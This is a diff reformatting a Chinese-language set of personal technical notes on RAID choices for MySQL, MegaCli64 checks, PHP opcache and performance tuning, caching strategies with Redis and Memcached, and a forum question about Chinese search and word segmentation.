@@ -15770,8 +15770,8 @@ MMM优缺点
 3、增加了维护工作、高可用问题。
 
 ### RAID
-```
 https://www.cnblogs.com/mysql-dba/p/7120601.html
+
 作为一名DBA，选择自己的数据存储在什么上面，应该是最基本的事情了。但是很多DBA却容易忽略了这一点，我就是其中一个。之前对raid了解的并不多，本文就记录下学习的raid相关知识。
 
 一、RAID的基础知识
@@ -15789,48 +15789,48 @@ RAID(Redundant Array of Independent Disk 独立冗余磁盘阵列)技术就是�
 我们比较常用的RAID级别有RAID-0、RAID-1、RAID-10/RAID-01、RAID-5，其他的如RAID-3、RAID-4、RAID-6就不在此介绍了。
 
 RAID-0
-         RAID-0采用数据分条技术（Striped）把多块磁盘串联成一个更为庞大的磁盘组，可以提高磁盘的性能和吞吐量。它读写数据的速度是最快的，要求比较低，要求两个磁盘即可做RAID-0，相对成本是最低的，但是RAID-0不提供冗余或奇偶校验数据的功能，如果驱动器出现故障，数据将无法恢复，安全性最弱。一般只是在那些对性能要求高、数据安全性要求不高的情况下才被使用，不适合数据库的存储。
 
-
+RAID-0采用数据分条技术（Striped）把多块磁盘串联成一个更为庞大的磁盘组，可以提高磁盘的性能和吞吐量。它读写数据的速度是最快的，要求比较低，要求两个磁盘即可做RAID-0，相对成本是最低的，但是RAID-0不提供冗余或奇偶校验数据的功能，如果驱动器出现故障，数据将无法恢复，安全性最弱。一般只是在那些对性能要求高、数据安全性要求不高的情况下才被使用，不适合数据库的存储。
 
 RAID-1
-        RAID-1采用镜像（Mirroring）的方式冗余数据。RAID-1要求至少两个或2xN个磁盘，每次写数据时会同时写入镜像盘。这种阵列可靠性很高，但其有效容量减小到总容量的一半，同时这些磁盘的大小应该相等，否则总容量只具有最小磁盘的大小。RAID-1的数据安全性在所有的RAID级别上来说是最好的。但是其磁盘的利用率却只有50%，是所有RAID级别中最低的。
 
-
+RAID-1采用镜像（Mirroring）的方式冗余数据。RAID-1要求至少两个或2xN个磁盘，每次写数据时会同时写入镜像盘。这种阵列可靠性很高，但其有效容量减小到总容量的一半，同时这些磁盘的大小应该相等，否则总容量只具有最小磁盘的大小。RAID-1的数据安全性在所有的RAID级别上来说是最好的。但是其磁盘的利用率却只有50%，是所有RAID级别中最低的。
 
 RAID-10
-        由于RAID-0和RAID-1都存在明显的优点和缺点，为了结合两者的优点、避免两者的缺点，从而产生了RAID-10，RAID-10适合用在速度需求高，又要完全容错，当然成本也很多的应用。不过在做RAID-10时需要注意的是先做RAID-1，再做RAID-0还是先做RAID-0，再做RAID-1，二者还是有区别的。举个栗子，假如现在有四块磁盘：
 
-        先做RAID-0，再做RAID-1：每两块磁盘先做RAID-0，在此基础上，再把两个RAID-0做成RAID-1。这时如果A类或者B类磁盘同时有一个故障，整个RAID将不可用。
+由于RAID-0和RAID-1都存在明显的优点和缺点，为了结合两者的优点、避免两者的缺点，从而产生了RAID-10，RAID-10适合用在速度需求高，又要完全容错，当然成本也很多的应用。不过在做RAID-10时需要注意的是先做RAID-1，再做RAID-0还是先做RAID-0，再做RAID-1，二者还是有区别的。举个栗子，假如现在有四块磁盘：
+
+先做RAID-0，再做RAID-1：每两块磁盘先做RAID-0，在此基础上，再把两个RAID-0做成RAID-1。这时如果A类或者B类磁盘同时有一个故障，整个RAID将不可用。
 
 (RAID 0) A = (Drive A1 + Drive A2) (Striped)
+
 (RAID 0) B = (Drive B1 + Drive B2) (Striped)
+
 (RAID-1)AB = (A +  B) (Mirrored)
-       先做RAID-1，再做RAID-0：每两块磁盘先做RAID-1，在此基础上，再把两个RAID-1做成RAID-0。这时只有A类或者B类磁盘两个都故障时，整个RAID才不可用。
+
+先做RAID-1，再做RAID-0：每两块磁盘先做RAID-1，在此基础上，再把两个RAID-1做成RAID-0。这时只有A类或者B类磁盘两个都故障时，整个RAID才不可用。
 
 (RAID-1) A = (Drive A1 + Drive A2) (Mirrored)
+
 (RAID-1) B = (Drive B1 + Drive B2) (Mirrored)
+
 (RAID-0)AB = (A +  B) (Striped)
+
 综合上面来看，先做RAID-1，再做RAID-0相对更安全，建议这种方式，所以我们平时说的RAID-10就是先做RAID-1，再做RAID-0。
 
 RAID-5
-        RAID-5应该处于RAID-0和RAID-1之间的一种工作模式，它尽量平衡RAID-0和RAID-1的优点和缺点，是我们平时使用比较多的一种模式。做RAID-5至少需要三块磁盘，它采用校验码冗余数据，校验信息分布在多个磁盘上，当数据每次写入到磁盘上，同时还需要写入校验信息，因此写入性能相对不如RAID-0。当某个磁盘出现故障，可以使用其他磁盘上校验信息来恢复数据。相对RAID-1，它磁盘空间利用率为(N-1)/N
 
-
+RAID-5应该处于RAID-0和RAID-1之间的一种工作模式，它尽量平衡RAID-0和RAID-1的优点和缺点，是我们平时使用比较多的一种模式。做RAID-5至少需要三块磁盘，它采用校验码冗余数据，校验信息分布在多个磁盘上，当数据每次写入到磁盘上，同时还需要写入校验信息，因此写入性能相对不如RAID-0。当某个磁盘出现故障，可以使用其他磁盘上校验信息来恢复数据。相对RAID-1，它磁盘空间利用率为(N-1)/N
 
 3、RAID的几种工作级别优缺点
 
- 
-
 【注】以上的高、中、低只是相对于RAID-0、RAID-1、RAID-10、RAID-5而言。
-
- 
 
 二、如何判断RAID级别、写入策略、电池状况
 
- 1、判断RAID级别：MegaCli64工具输入磁盘信息如下：
+1、判断RAID级别：MegaCli64工具输入磁盘信息如下：
 
-复制代码
+```
 [root()@xxxx ~]# MegaCli64 -LdInfo -lAll -aALL
                                      
 Adapter 0 -- Virtual Drive Information:
@@ -15886,81 +15886,73 @@ Bad Blocks Exist: No
 PI type: No PI
 
 Is VD Cached: No
-复制代码
+```
 网上有人仅仅通过RAID Level列中的Primary-1, Secondary-0, RAID Level Qualifier-0来判断，我认为不是很准确。先来了解下Primary、Secondary、RAID Level Qualifier啥意思？
 
 Primary字段：基本上可以确定RAID的级别，但是无法区分是RAID-1和RAID-10，因为有情况下他们的Primary值都是Primary-1, Secondary-0, RAID Level Qualifier-0
 
 在这种情况下如何区分RAID-1和RAID-10？我认为还得结合另外两列进行判断：
-
+```
 Number Of Drives per span   : 2    #每个区段有2块磁盘
 Span Depth                  : 3    #一共三个区段
+```
 结合primary-1，该RAID表示一共六块磁盘，每两个做RAID-1，最后将三个RAID-1做RAID-0
+
 【总结：如何判断RAID级别】：
 
 1)  除了RAID-1和RAID-10，其他级别通过Primary字段值就可以判断；
 
 2) 至于RAID-1和RAID-10，还需要结合Number Of Drives （per span）、Span Depth两列的值，如果Span Depth值为1表示为RAID-1，不为1表示RAID-10;还有一种情况：Primary-1, Secondary-3, RAID Level Qualifier-0也是表示RAID-10;
 
- 
-
- 
-
 2、判断RAID写入策略和电池状态
-
- 
 
 RAID的写入策略对IO性能有很大影响，有两种写入策略：
 
 WriteBack：表示写入到磁盘缓存上，写入性能好，如果采用此策略，RAID必须支持电池可用，否则一旦断点，数据将丢失。
+
 WriteThrough：表示直接写入到硬盘上，写入性能没有WriteBack好，一般没有电池时采用此策略
+
 2.1）查看RAID的写入策略
 
-复制代码
+```
 [root()@xxxx ~]# MegaCli64 -LDInfo -Lall -aALL|grep 'Cache Policy'
 **********************************************************************************
 Default Cache Policy: WriteBack, ReadAdaptive, Direct, Write Cache OK if Bad BBU
 Current Cache Policy: WriteBack, ReadAdaptive, Direct, Write Cache OK if Bad BBU 
 以上表示采用WriteBack（回写）策略，如果电池坏了也强制写入cache
-  Default Cache Policy: WriteThrough, ReadAheadNone, Direct, No Write Cache if Bad BBU
-  Current Cache Policy: WriteThrough, ReadAheadNone, Direct, No Write Cache if Bad BBU
-
-  如果是这个，表示采用WriteThrough策略
-
+Default Cache Policy: WriteThrough, ReadAheadNone, Direct, No Write Cache if Bad BBU
+Current Cache Policy: WriteThrough, ReadAheadNone, Direct, No Write Cache if Bad BBU
+如果是这个，表示采用WriteThrough策略
 **********************************************************************************
+```
 Disk Cache Policy   : Disabled     #表示硬盘的cache，一般这里禁用，防止丢失数据
-复制代码
-2.2）查看电池状态
 
+2.2）查看电池状态
+```
 [root()@xxxx ~]# MegaCli64 -adpbbucmd -aall |grep -E  'Battery State|Charger Status|isSOHGood|Relative State of Charge'                        
 Battery State     : Operational  #电池状态，operational表示正在运行
 Relative State of Charge: 98 %   #电池电量，如果低于15%，那么写入策略会由WB转变为WC,IO性能下降，需要关注
 Charger Status: Complete         #充电情况，表示已完成
 isSOHGood: Yes                   #不是Yes需要关注
- 
+``` 
 
 三、MySQL适合的RAID存储方案
 
- 通过上面对RAID的了解，我们已经知道各级别RAID的优缺点，对于MySQL数据库的存储，如何选择RAID级别呢？
+通过上面对RAID的了解，我们已经知道各级别RAID的优缺点，对于MySQL数据库的存储，如何选择RAID级别呢？
 
- 我们可以根据MySQL各种文件类型分别选择，MySQL数据库重要的文件类型有：
+我们可以根据MySQL各种文件类型分别选择，MySQL数据库重要的文件类型有：
 
 1、数据文件(frm,ibd)：存储核心的数据，非常重要，安全性要求高，同时需要频繁的写入、更新数据，磁盘性能要求也比较高，首先建议物理磁盘是SSD，对于RAID的选择，如果预算足够，建议RAID-10，其次是RAID-5
 
 2、二进制日志文件：写入非常频繁，写性能要求高，由于从库依赖该文件，安全性也很重要，综合成本考虑，可以用两块SATA硬盘，做成RAID-1即可。
 
 3、redo文件，共享表空间文件：安全性要求高，如果预算足够，RAID-10，通常RAID-1也是可以的，一般而言，redo文件和共享表空间和数据文件存储在一起即可。
-```
 
 ### 源代码编译、内存调优
-```
 https://www.cnblogs.com/lin3615/p/5638219.html
-最近安装了 php5.6，发现有了 opcache.so扩展文件，于是，搜索了一下，
-发现 zend opcache已经融入到 ph5.5以上的版本了,即兴奋，不用再去找
-xcache,apc,eAccelerator 这些缓存了
-PHP手册上面也说了好详细的配置文件说明，这里不再详情说明,
-最好是把编译生成的 opcache.so和别的扩展放一起
-基本的配置可以这样配置即可(php.ini文件)
+
+最近安装了 php5.6，发现有了 opcache.so扩展文件，于是，搜索了一下， 发现 zend opcache已经融入到 ph5.5以上的版本了,即兴奋，不用再去找 xcache,apc,eAccelerator 这些缓存了 PHP手册上面也说了好详细的配置文件说明，这里不再详情说明, 最好是把编译生成的 opcache.so和别的扩展放一起 基本的配置可以这样配置即可(php.ini文件)
+```
 zend_extension=opcache.so
 opcache.enable=1
 opcache.enable_cli=1
@@ -15969,36 +15961,38 @@ opcache.interned_strings_buffer=8
 opcache.max_accelerated_files=100000
 opcache.validate_timestamps=1
 opcache.revalidate_freq=7200
-以上的是基本配置，就可以使用了，具体更高级，根据实际情况，
-可以修改相关参数设置，手册上面已经说得好清楚了
-几乎什么事情，用得好就是如虎添冀，用不好，就是一个大坑。
-所以，如果启用了，文件修改了，时间不到，还没有生效,
-所以，为了立即生效，可以重新web服务，但一般这些不可取，会造成中断
-opache提供了 opcache_invalidate(文件名,true),此时则立即重新编译,
-opcache_reset()这个是在生成此文件前生效，如果一旦生成了，还没有
-过期的，则不会生效.所以，要做到让变更的文件立即生效，可以生成一个文件，
-当有更改文件时，执行一下这个文件即可
+```
+以上的是基本配置，就可以使用了，具体更高级，根据实际情况， 可以修改相关参数设置，手册上面已经说得好清楚了 几乎什么事情，用得好就是如虎添冀，用不好，就是一个大坑。
 
+所以，如果启用了，文件修改了，时间不到，还没有生效, 所以，为了立即生效，可以重新web服务，但一般这些不可取，会造成中断 opache提供了 opcache_invalidate(文件名,true),此时则立即重新编译, opcache_reset()这个是在生成此文件前生效，如果一旦生成了，还没有 过期的，则不会生效.所以，要做到让变更的文件立即生效，可以生成一个文件， 当有更改文件时，执行一下这个文件即可
+```
 <?php
 // as: change.php
 opcache_reset();
 opcache_invalidate('文件路径', true); // 立即重新编译,可以用绝对路径
 ```
 
-
 ### php性能优化
-```
 php语言级的性能优化
+
 优化点：少写代码，多用php自身能力
+
 - 性能问题：自身代码冗余较多，可读性不佳，并且性能低。
+
 - 为什么性能低：php代码需要编译解析为底层语言，这一过程每次请求都会处理一遍，开销大。
+
 - 解决方案：多用php内置变量、常量、函数
+
 - 测试方法：直接使用ab对比
 
 优化点：php内置函数的性能优劣
+
 - 性能问题：php内置函数，之间依然存在快慢差异
+
 - 解决方案：多去了解php内置函数的时间复杂度
+
 - 测试方法：对比isset()和array_key_exists()的性能差异
+```
 <?php
     $start = current_time();
     $i = 0;
@@ -16016,142 +16010,193 @@ php语言级的性能优化
         return ((float)$usec + (float)$sec);
     }
 ?>
+```
 优化点：尽可能少用魔法函数
+
 - 情况描述：php提供的魔法函数，性能不佳
+
 - 为什么性能低：为了给php程序员省事，php语言为你做了很多
+
 - 解决方案：尽可能规避使用魔法函数
+
 - 测试方法：time php test.php
+
     - time  liunx命令
+
     - php 指定程序
+
     - test.php 指定文件 
+
     > 注意：php主要在返回值中看user耗时
 
 优化点：产生额外开销在错误抑制符
+
 - 情况描述：php提供的错误抑制符只是为了方便懒人
+
 - @的实际逻辑：在代码开始前，结束后，增加Opcode,忽略报错
+
     vld php Opcode查看扩展:用于将Opcode显示出来
+
 - 解决方案：尽量不要使用@错误抑制符
+
 - 测试方法：php -dvld.active=1 -dvld.execute=0 at.php
-    
+
 - php 执行php的vld显示Opcode
     
 优化点：避免在循环内做运算
+
 - 情况描述：循环内在函数或运算会被重复执行
+
 - 解决方案：在循环外获取需要在值，再给循环操作
 
 优化点：减少计算密集型业务
+
 - 情况描述：php不适合密集型的场景
+
 - 为什么：php语言特性决定php不适合做大数据业务
+
 - php适合场景：适合衔接webserver与sql
 
 优化点：务必使用带引号字符串做键值
+
 - 情况描述：php会将没有引号的键值当作常量，产生查找常量在开销。
+
 - 解决方案：严格使用带引号作为键值
 
 php周边问题的性能优化
+
 - php周边有什么:
+
     - linux运行环境
+
     - 文件存储  硬盘
+
     - 数据库    mysql
+
     - 缓存      redis
+
     - 网络  
 
 优化点：减少文件类操作
+
 - 常见php场景在开销次序
+
 读写内存 << 读写数据库 << 读写磁盘 << 读写网络数据
 
 优化点：优化网络请求
+
 - 网络请求的坑：
+
     1. 对方接口的不确定因素
+
     2. 网络稳定性
+
 - 如何优化网络请求：
+
     - 设置超时时间
+
     1. 连接超时 <200ms
+
     2. 读超时   <800ms
+
     3. 写超时   <500ms
+
     - 将串行请求并行化
+
     1. 使用curl_multi_###()
+
     2. 使用swoole扩展
 
 优化点：压缩php接口输出
+
 - 如何压缩：使用Gzip即可
+
 - 压缩的利于弊：利于我们的数据输出，Client段能更快获取数据;弊端为会有额外的CPU开销
 
 优化点：缓存重复计算内容
+
 - 什么情况下坐输出内容缓存：多次请求，内容不变情况
 
 重叠时间窗口思想===并行
+
 旁路方案===并行
 
 php语言自身分析、优化
+
  php性能分析
 
 工具:XHPorf（源自FackBook的php性能分析工具）
+
 实践：通过分析Wordpress程序，做优化。
+
 使用: php --ri xhprof   查看版本
+
 在入口文件index.php添加
-
+```
 xhprof_enable();
-
 // ...
-
 $data = xhporf_disable();
 include_once "/var/www/html/xhprof_lib/utils/xhprof_lib.php";
 include_once "/var/www/html/xhprof_lib/utils/xhprof_runs.php";
 $objXhprofRun = new XHProfRuns_Default();
 $run_id = $objXhprofRun->save_run($data,"test");
 var_dump($run_id);
+```
 查看xhp目录查看相关信息
+
 参数：
+
     runction_name   函数名
+
     calls   被调用在次数
+
     InclWallTime    当流程走到该函数，之前和现在这个函数处理在总耗时
+
     ExclWallTime    这个函数执行了多少微秒
 
 其他工具推荐：
+
     ab  压力测试
+
     vld opcode代码分析
 
 php性能瓶颈解决方案：
+
     Opcode Cache:php扩展APC等
+
     peci.php.net    php扩展网站
+
     使用php扩展解决复杂的业务
+
     Runtime优化:HHVM
 
  Apache Benchmark(ab)
 
 > ab是由Apache提供的压力测试软件。安装apache服务器时会自带该压测软件
+
 - 使用方法: ./ab -n1000 -c100 http://www.baidu.com/
+
     - -n 请求数
+
     - -c 并发数
+
     - http 压测目标地址
+
     - -h 帮助 
 
-###*返回参数说明**
+返回参数说明
+
 - Requests per second（每秒接受请求数尽可能多）
+
 - Time per request（每秒请求在耗时尽可能少）
-```
 
 ### 缓存
-```
 https://segmentfault.com/a/1190000019142897
 
-SegmentFault
-首页
-问答
-专栏
-资讯
-课程
-活动
-发现
-搜索关键字
+系统的讲解 - PHP 缓存技术 cdn缓存nosql缓存设计缓存php
 
-新亮
- 2.4k
-系统的讲解 - PHP 缓存技术
-cdn缓存nosql缓存设计缓存php
-发布于 2019-05-10
 概述
+
 缓存已经成了项目中是必不可少的一部分，它是提高性能最好的方式，例如减少网络I/O、减少磁盘I/O 等，使项目加载速度变的更快。
 
 缓存可以是CPU缓存、内存缓存、硬盘缓存，不同的缓存查询速度也不一样（CPU缓存 > 内存缓存 > 硬盘缓存）。
@@ -16167,7 +16212,7 @@ cdn缓存nosql缓存设计缓存php
 根据 Expires 和 Cache-Control 判断是否命中强缓存。
 
 代码如下：
-
+```
 header('Expires: '. gmdate('D, d M Y H:i:s', time() + 3600). ' GMT');
 header("Cache-Control: max-age=3600"); //有效期3600秒
 Cache-Control 还可以设置以下参数：
@@ -16176,11 +16221,13 @@ public：可以被所有的用户缓存（终端用户的浏览器/CDN服务器�
 private：只能被终端用户的浏览器缓存
 no-cache：不使用本地缓存
 no-store：禁止缓存数据
+```
 协商缓存
+
 用户发送的请求，发送给服务器，由服务器判定是否使用客户端缓存。
 
 代码如下：
-
+```
 $last_modify = strtotime($_SERVER['HTTP_IF_MODIFIED_SINCE']);
 if (time() - $last_modify < 3600) {
     header('Last-Modified: '. gmdate('D, d M Y H:i:s', $last_modify).' GMT');
@@ -16188,7 +16235,9 @@ if (time() - $last_modify < 3600) {
     exit;
 }
 header('Last-Modified: '. gmdate('D, d M Y H:i:s').' GMT');
+```
 用户操作行为对缓存的影响
+```
 操作行为	Expires	Last-Modified
 地址栏回车	有效	有效
 页面跳转	有效	有效
@@ -16196,21 +16245,29 @@ header('Last-Modified: '. gmdate('D, d M Y H:i:s').' GMT');
 前进/后退	有效	有效
 F5刷新	无效	有效
 Ctrl+F5刷新	无效	无效
+```
 文件缓存
+
 数据文件缓存
+
 将更新频率低，读取频率高的数据，缓存成文件。
 
 比如，项目中多个地方用到城市数据做三级联动，我们就可以将城市数据缓存成一个文件（city_data.json），JS 可以直接读取这个文件，无需请求后端服务器。
 
 全站静态化
+
 CMS（内容管理系统），也许大家都比较熟悉，比如早期的 DEDE、PHPCMS，后台都可以设置静态化HTML，用户在访问网站的时候读取的都是静态HTML，不用请求后端的数据库，也不用Ajax请求数据接口，加快了网站的加载速度。
 
 静态化HTML有以下优点：
 
 有利于搜索引擎的收录（SEO）
+
 页面打开速度快
+
 减少服务器负担
+
 CDN缓存
+
 CDN（Content Delivery Network）内容分发网络。
 
 用户访问网站时，自动选择就近的CDN节点内容，不需要请求源服务器，加快了网站的打开速度。
@@ -16218,7 +16275,9 @@ CDN（Content Delivery Network）内容分发网络。
 缓存主要包括 HTML、图片、CSS、JS、XML 等静态资源。
 
 NoSQL缓存
+
 Memcached 缓存
+
 Memcached 是高性能的分布式内存缓存服务器。
 
 一般的使用目的是，通过缓存数据库查询结果，减少数据库访问次数，以提高动态Web应用的速度、提高可扩展性。
@@ -16230,8 +16289,11 @@ Memcached 仅支持K/V类型的数据，不支持持久化存储。
 Memcache 与 Memcached 的区别
 
 Memcached 从0.2.0开始，要求PHP版本>=5.2.0，Memcache 要求PHP版本>=4.3。
+
 Memcached 最后发布时间为2018-12-24，Memcache 最后发布时间2013-04-07。
+
 Memcached 基于libmemcached，Memcache 基于PECL扩展。
+
 可以将 Memcached 看作是 Memcache 的升级版。
 
 PHP Memcached 使用手册：
@@ -16252,6 +16314,7 @@ Redis 在日常工作中使用的居多。
 Redis 学习网址：http://www.redis.cn/
 
 MongoDB缓存
+
 MongoDB 是一个基于分布式文件存储的数据库。由 C++ 语言编写。
 
 旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。
@@ -16261,11 +16324,13 @@ MongoDB 是一个介于关系数据库和非关系数据库之间的产品，是
 MongoDB 学习网址：http://www.mongodb.org.cn
 
 WEB服务器缓存
+
 Apache缓存
+
 利用 mod_expires ，指定缓存的过期时间，可以缓存HTML、图片、JS、CSS 等。
 
 打开 http.conf，开启模块：
-
+```
 LoadModule expires_module modules/mod_expires.so
 指定缓存的过期时间：
 
@@ -16290,19 +16355,23 @@ LoadModule expires_module modules/mod_expires.so
      ExpiresByType image/x-icon A8640000
 
  </IfModule>
+```
 Nginx缓存
+
 利用 expire 参数，指定缓存的过期时间，可以缓存HTML、图片、JS、CSS 等。
 
 打开 nginx.conf ：
-
+```
 //以图片为例：
 location ~\.(gif|jpg|jepg|png|bmp|ico)$ { #加入新的location
     root html;
     expires 1d; #指定缓存时间
 }
+```
 大家也可以了解下：proxy_cache_path 和 proxy_cache，进行缓存的设置。
 
 Opcode缓存
+
 Opcode（Operate Code）操作码。
 
 PHP程序运行完后，马上释放所有内存，所有程序中的变量都销毁，每次请求都要重新翻译、执行，导致速度可能会偏慢。
@@ -16312,6 +16381,7 @@ PHP程序运行完后，马上释放所有内存，所有程序中的变量都�
 操作码 的目地是避免重复编译，减少CPU和内存开销。
 
 APC缓存
+
 APC（Alternative PHP Cache）可选 PHP 缓存。
 
 APC 的目标是提供一个自由、 开放，和健全的框架，用于缓存、优化 PHP 中间代码。
@@ -16323,16 +16393,19 @@ APC 扩展最后的发布时间为 2012-09-03。
 感兴趣可以了解下，官方介绍：http://php.net/manual/zh/book...
 
 eAccelerator
+
 eAccelerator：A PHP opcode cache。
 
 感兴趣可以了解下，官方介绍：http://eaccelerator.net/
 
 XCache
+
 XCache 是一个又快又稳定的 PHP opcode 缓存器。
 
 感兴趣可以了解下，官方介绍：http://xcache.lighttpd.net/
 
 小结
+
 文章主要简单的介绍了 浏览器缓存、文件缓存、NoSQL缓存、WEB服务器缓存、Opcode缓存。
 
 每一种缓存都可以深入研究，从介绍 -> 安装 -> 使用 -> 总结应用场景。
@@ -16342,36 +16415,38 @@ XCache 是一个又快又稳定的 PHP opcode 缓存器。
 还可以再使用哪些缓存，可以对我们的项目有帮助？
 
 关于缓存的常见问题
+
 用过缓存，大家肯定遇到过比较头痛的问题，比如数据一致性，雪崩，热点数据缓存，缓存监控等等。
 
 给大家列出几个问题，纯属抛转引玉。
 
 当项目中使用到缓存，我们是选择 Redis 还是 Memcached ，为什么？
+
 举一些场景：
 
 一、比如实现一个简单的日志收集功能或发送大量短信、邮件的功能，实现方式是先将数据收集到队列中，然后有一个定时任务去消耗队列，处理该做的事情。
 
 直接使用 Redis 的 lpush，rpop 或 rpush，lpop。
-
+```
 //进队列
 $redis->lpush(key, value);
 
 //出队列
 $redis->rpop(key);
 Memcached 没有这种数据结构。
-
+```
 二、比如我们要存储用户信息，ID、姓名、电话、年龄、身高 ，怎么存储？
 
 方案一：key => value
-
+```
 key = user_data_用户ID
 
 value = json_encode(用户数据)
-
+```
 查询时，先取出key，然后进行json_decode解析。
 
 方案二：hash
-
+```
 key = user_data_用户ID
 
 hashKey = 姓名，value = xx
@@ -16381,9 +16456,9 @@ hashKey = 电话，value = xx
 hashKey = 年龄，value = xx
 
 hashKey = 身高，value = xx
-
+```
 查询时，取出key即可。
-
+```
 //新增
 $redis->hSet(key, hashKey, value);
 $redis->hSet(key, hashKey, value);
@@ -16395,6 +16470,7 @@ $redis->hSet(key, hashKey, value);
 //查询
 $redis->hGetAll(key); //查询所有属性
 $redis->hGet(key, hashKey); //查询某个属性
+```
 方案二 优于 方案一。
 
 三、比如社交项目类似于新浪微博，个人中心的关注列表和粉丝列表，双向关注列表，还有热门微博，还有消息订阅 等等。
@@ -16423,6 +16499,7 @@ Memcached 默认使用 Slab Allocation 机制管理内存，按照预先规定�
 具体问题具体分析吧。
 
 缓存穿透怎么办？
+
 用户请求缓存中不存在的数据，导致请求直接落在数据库上。
 
 一、设置有规则的Key值，先验证Key是否符合规范。
@@ -16434,303 +16511,209 @@ Memcached 默认使用 Slab Allocation 机制管理内存，按照预先规定�
 四、为不存在的key值，设置空缓存和过期时间，如果存储层创建了数据，及时更新缓存。
 
 雪崩怎么办？
+
 一、互斥锁，只允许一个请求去重建索引，其他请求等待缓存重建执行完，重新从缓存获取数据。
 
 二、双缓存策略，原始缓存和拷贝缓存，当原始缓存失效请求拷贝缓存，原始缓存失效时间设置为短期，拷贝缓存设置为长期。
 
 已上，纯属抛转引玉，结合自己的情况，具体问题，具体分析吧。
 
-推荐阅读
-系统的讲解 - SSO 单点登录
-系统的讲解 - PHP WEB 安全防御
-系统的讲解 - PHP 接口签名验证
-系统的讲解 - PHP 浮点数高精度运算
-一起学习
-
-
- 
-阅读 4k 更新于 3月25日
-本作品系 原创， 采用《署名-非商业性使用-禁止演绎 4.0 国际》许可协议
-
-新亮
- 2.4k
-0 条评论
-得票时间
-
-撰写评论 ...
-推荐阅读
-Java高并发架构设计
-在电商相关产品开发的这些年，我有幸的遇到了并发下的各种坑，这一路摸爬滚打过来有着不少的血泪史，这里进行的总结，作为自己的归档记录，同时分享给大家。
-
-Java将军007  阅读 5.2k  27 赞  1 评论
-
-大型网站技术架构-入门梳理
-大型网站技术架构-入门梳理 标签 ： 架构设计 [TOC] 罗列了大型网站架构涉及到的概念，附上了简单说明 前言 本文是对《大型网站架构设计》(李智慧 著)一书的梳理，类似文字版的“思维导图” 全文主要围绕“性能，可...
-
-brianway  阅读 3.5k  24 赞
-
-大型分布式网站架构实战项目分析
-distributed system is one in which components located at networked computers communicate and coordinate their actions only by passing messages（分布式系统是指位于网络计算机的组件仅通过传递消息来通...
-
-bali  阅读 1.7k  19 赞  2 评论
-
-深度解析大型分布式电商网站演变过程以及构架部署解决方案
-本文是学习大型分布式网站架构的技术总结。对架构一个高性能，高可用，可伸缩，可扩展的分布式网站进行了概要性描述，并给出一个架构参考。一部分为读书笔记，一部分是个人经验总结。对大型分布式网站架构有很好...
-
-bali  阅读 2.3k  16 赞
-
-浅谈秒杀系统架构设计
-秒杀是电子商务网站常见的一种营销手段。 原则 不要整个系统宕机。 即使系统故障，也不要将错误数据展示出来。 尽量保持公平公正。 实现效果 秒杀开始前，抢购按钮为活动未开始。 秒杀开始时，抢购按钮可以点击下...
-
-新亮  阅读 4.8k  8 赞  2 评论
-
-支撑千万级，大型电商分布式架构解析
-大型分布式网站架构概述 1.1. 大型网站的特点用户多，分布广泛 大流量，高并发 海量数据，服务高可用 安全环境恶劣，易受网络攻击 功能多，变更快，频繁发布 从小到大，渐进发展 以用户为中心 免费服务，付费体验...
-
-李红  阅读 637  6 赞
-
-Java 应用一般架构
-现在我们常见的不同系统不同语言之间的交互使用WebService，Http请求。WebService，即“Web 服务”，简写为 WS。从字面上理解，它其实就是“基于 Web 的服务”。而服务却是双方的，有服务需求方，就有服务提供方。服...
-
-CODING  阅读 2.3k  3 赞  1 评论
-
-Java 高并发环境下的性能优化，揭秘支付宝技术内幕
-在电商相关产品开发的这些年，我有幸的遇到了并发下的各种坑，这一路摸爬滚打过来有着不少的血泪史，这里进行的总结，作为自己的归档记录，同时分享给大家。
-
-Java高端架构师  阅读 276  2 赞
-
-新亮笔记
-用户专栏
-技术的深度和广度只能靠自己努力去发掘，谁也不能替你学习，在这里希望你能有所收获。
-
-934 人关注
-74 篇文章
-
-Planets
-广告位促销，月曝光三千万，10 元/天
-大厂进阶之路
-BAT资深研发工程师带你丰富PHP技能树
-Python3.x核心技术与实战
-BAT 专家亲手教你真正的编程
-前端晋升必备技能
-iview核心开发者亲自教你Vue实战
-2020 年新版 Springboot 2.3 教程
-Spring5 / Mybatis / Vue / Cubeui
-▶ 目录
-后端知识库
-产品
-热门问答
-热门专栏
-热门课程
-最新活动
-技术圈
-酷工作
-移动客户端
-课程
-Java 开发课程
-PHP 开发课程
-Python 开发课程
-前端开发课程
-移动开发课程
-资源
-每周精选
-用户排行榜
-徽章
-帮助中心
-声望与权限
-社区服务中心
-合作
-关于我们
-广告投放
-职位发布
-讲师招募
-联系我们
-合作伙伴
-关注
-产品技术日志
-社区运营日志
-市场运营日志
-团队日志
-社区访谈
-条款
-服务条款
-隐私政策
-下载 App
-Copyright © 2011-2020 SegmentFault.
-
-浙ICP备 15005796号-2 浙公网安备 33010602002000号 杭州堆栈科技有限公司版权所有
-
-   
-请登录后复制
-
-```
-
 ### 搜索解决方案
-```
-
-首页   注册   登录
-V2EX = way to explore
-V2EX 是一个关于分享和探索的地方
-现在注册
-已注册用户请  登录
-
- 
-F0urV2EX  ›  PHP
 关于PHP搜索引擎和中文分词的解决方案的咨询
-  1     F0ur · 2013-09-22 01:00:04 +08:00 · 5746 次点击
-这是一个创建于 2518 天前的主题，其中的信息可能已经有所发展或是发生改变。
+
 需要选择一个搜索引擎+中文分词的方案
+
 查了一些资料，目前有3个方案
+
 1.coreseek
+
 基于sphinx+LibMMSeg
+
 我唯一担心的是因为coreseek长期不更新,最新版用的还是sphinx 2.0.2 dev,会不会有什么问题
 
 2.sphinx for chinese
+
 基于sphinx+xdict
+
 一样长期不更新，最新版用的sphinx 2.1.0 dev, 社区中关于分词系统也指出了一些不足
 
 3.xunsearch
+
 基于xapian+scws
+
 更新稳定，但是无从下手，指南写的还是有些问题，当然，我还没去重点研究
 
 因为我对这方面知识了解的不多，只能根据需求找到这3个解决方案，也无法着重做个对比或者选择
+
 所以请懂行的大大们指点一下我，或者有更好的选择方案
+
 先感谢下所有回复的诸位了
- sphinx 分词 最新版9 条回复  •  2014-09-10 09:56:38 +08:00
-liuxurong		    1
-liuxurong   2013-09-22 01:32:18 +08:00 via iPad
+
 用 v2ex 方案就可以了
-ted05		    2
-ted05   2013-09-22 06:42:44 +08:00
-信息检索这个挺难的，最近在学用java是怎么实现的。。。
-angelface		    3
-angelface   2013-09-22 06:48:58 +08:00 via iPhone
+
